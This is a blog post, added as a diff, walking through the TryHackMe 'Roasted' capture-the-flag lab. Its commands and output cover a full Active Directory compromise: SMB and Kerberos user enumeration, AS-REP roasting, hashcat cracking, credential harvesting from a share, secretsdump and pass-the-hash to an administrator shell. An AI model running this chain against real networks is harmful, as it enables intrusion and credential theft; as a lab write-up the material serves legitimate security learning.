@@ -1,0 +1,149 @@
+---
+layout: post
+title:  "Roasted (THM)"
+date:   2025-08-02 19:30:43 -0400
+author: robo.uzi
+tags: [TryHackMe, ctf]
+---
+
+## Initial Compromise
+
+I run a full port scan: `nmap -Pn -p- -v 10.10.193.130 -oN roastedfullnmap.txt`
+```shell
+PORT      STATE SERVICE  
+53/tcp    open  domain  
+88/tcp    open  kerberos-sec  
+135/tcp   open  msrpc  
+139/tcp   open  netbios-ssn  
+389/tcp   open  ldap  
+445/tcp   open  microsoft-ds  
+464/tcp   open  kpasswd5  
+593/tcp   open  http-rpc-epmap  
+636/tcp   open  ldapssl  
+3268/tcp  open  globalcatLDAP  
+3269/tcp  open  globalcatLDAPssl  
+5985/tcp  open  wsman  
+9389/tcp  open  adws  
+49666/tcp open  unknown  
+49668/tcp open  unknown  
+49669/tcp open  unknown  
+49670/tcp open  unknown  
+49673/tcp open  unknown  
+49694/tcp open  unknown
+```
+I ran nmap with the `-sV` and `-sC` flags on these ports after this scan. It's a lot of output so I didnt include it here.
+
+First I run `ldapsearch -x -H ldap://10.10.73.108 -s base`. It doesnt give me much.
+
+I run this `smbclient -L //10.10.73.108 -N` and find:
+```shell
+       Sharename       Type      Comment  
+       ---------       ----      -------  
+       ADMIN$          Disk      Remote Admin  
+       C$              Disk      Default share  
+       IPC$            IPC       Remote IPC  
+       NETLOGON        Disk      Logon server share    
+       SYSVOL          Disk      Logon server share    
+       VulnNet-Business-Anonymous Disk      VulnNet Business Sharing  
+       VulnNet-Enterprise-Anonymous Disk      VulnNet Enterprise Sharing  
+Reconnecting with SMB1 for workgroup listing.  
+do_connect: Connection to 10.10.73.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)  
+Unable to connect with SMB1 -- no workgroup available
+```
+
+I run `smbclient //10.10.73.108/VulnNet-Enterprise-Anonymous -N` and `smbclient //10.10.73.108/VulnNet-Business-Anonymous -N`. There are 6 text files. There are 4 names in the files. Alexa Whitehat, Jack Goldenhand, Tony Skid, and Johnny Leet.
+
+I generate a wordlist of possible usernames with this program: [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy). The command was `./username-anarchy --input-file /home/ron/Desktop/ctf/roasted/users.txt`. This didnt generate enough usernames and I ended up telling chatgpt to make more permutations with lowercase and capital letters.
+
+I then use `kerbrute` from [https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3). I run `./kerbrute userenum -d vulnnet-rst.local --dc 10.10.131.31 /home/user/Desktop/ctf/roasted/bigusers.txt`
+
+I get:
+```shell
+   __             __               __        
+  / /_____  _____/ /_  _______  __/ /____    
+ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \  
+/ ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/  
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                           
+  
+Version: v1.0.3 (9dad6e1) - 04/09/25 - Ronnie Flathers @ropnop  
+  
+2025/04/09 21:48:32 >  Using KDC(s):  
+2025/04/09 21:48:32 >   10.10.131.31:88  
+  
+2025/04/09 21:48:33 >  [+] VALID USERNAME:       A-Whitehat@vulnnet-rst.local  
+2025/04/09 21:48:33 >  [+] VALID USERNAME:       a-whitehat@vulnnet-rst.local  
+2025/04/09 21:48:33 >  [+] VALID USERNAME:       j-goldenhand@vulnnet-rst.local  
+2025/04/09 21:48:33 >  [+] VALID USERNAME:       J-Goldenhand@vulnnet-rst.local  
+2025/04/09 21:48:33 >  [+] VALID USERNAME:       t-skid@vulnnet-rst.local  
+2025/04/09 21:48:33 >  [+] VALID USERNAME:       T-Skid@vulnnet-rst.local  
+2025/04/09 21:48:33 >  [+] VALID USERNAME:       j-leet@vulnnet-rst.local  
+2025/04/09 21:48:33 >  [+] VALID USERNAME:       J-Leet@vulnnet-rst.local  
+2025/04/09 21:48:33 >  Done! Tested 32 usernames (8 valid) in 0.978 seconds
+```
+
+I finally remember I need to put to put the domain in my `/etc/hosts` file as such: `10.10.131.31 vulnnet-rst.local`
+
+I run the command `impacket-GetNPUsers -no-pass -usersfile bigusers.txt vulnnet-rst.local/` to determine whether there’s an account that we can ask for Kerberos tickets from without using any password.
+
+I get a hit:
+```shell
+$krb5asrep$23$T-Skid@VULNNET-RST.LOCAL:6c3a430ab8a1668151c30c8285d64e1b$2696bb8fcd1bc159b287ea70e5a7bc65ae53eee715a76b069ec70f835004d00072d1117b05ef2663969cfa075ea5764cc4412463efff66fcb7bfa6bb17cddcc2584791d0d84...
+```
+
+After running the hashcat command `hashcat -m 18200 kerb.txt /usr/share/wordlists/rockyou.txt` I get the password.
+
+I run the command `smbmap -H 10.10.131.31 -u t-skid -p 'redacted'` to check what I have access to as this user. I get this:
+```shell
+[+] IP: 10.10.131.31:445        Name: vulnnet-rst.local                                    
+ Disk                                   Permissions     Comment  
+ ----                                   -----------     -------  
+ ADMIN$                                 NO ACCESS       Remote Admin  
+ C$                                     NO ACCESS       Default share  
+ IPC$                                   READ ONLY       Remote IPC  
+ NETLOGON                               READ ONLY       Logon server share        SYSVOL                                 READ ONLY       Logon server share        VulnNet-Business-Anonymous             READ ONLY       VulnNet Business Sharing  VulnNet-Enterprise-Anonymous          READ ONLY       VulnNet Enterprise Sharing
+```
+
+I run `smbclient //10.10.131.31/NETLOGON --user t-skid` and his password. I find a file called `ResetPassword.vbs` which contained plaintext creds for `a-whitehat`.
+```shell
+strUserNTName = "a-whitehat"  
+strPassword = "redacted"
+```
+
+I connect with the new creds with `impacket-wmiexec vulnnet-rst.local/a-whitehat:redacted@10.10.131.31`
+
+From here the first flag was found at `C:\Users\enterprise-core-vn\Desktop\user.txt`
+
+___
+
+## Privilege Escalation
+
+From here I can dump the admin hash with `impacket-secretsdump vulnnet-rst.local/a-whitehat:redacted@10.10.131.31`
+
+I get the hashes:
+```shell
+[*] Service RemoteRegistry is in stopped state  
+[*] Starting service RemoteRegistry  
+[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a  
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)  
+Administrator:500:hash:::  
+Guest:501:hash:::  
+DefaultAccount:503:hash:::
+```
+
+I can pass the admin hash with evil-winrm: `evil-winrm -u Administrator -H <hash> -i 10.10.240.82 -N`
+
+I get a shell as admin:
+```shell
+Evil-WinRM shell v3.5  
+                                          
+Warning: Remote path completion is disabled  
+                                          
+Info: Establishing connection to remote endpoint  
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami    
+vulnnet-rst\administrator  
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+I get the final flag: `*Evil-WinRM* PS C:\Users\Administrator\Desktop> type system.txt`
+
+___
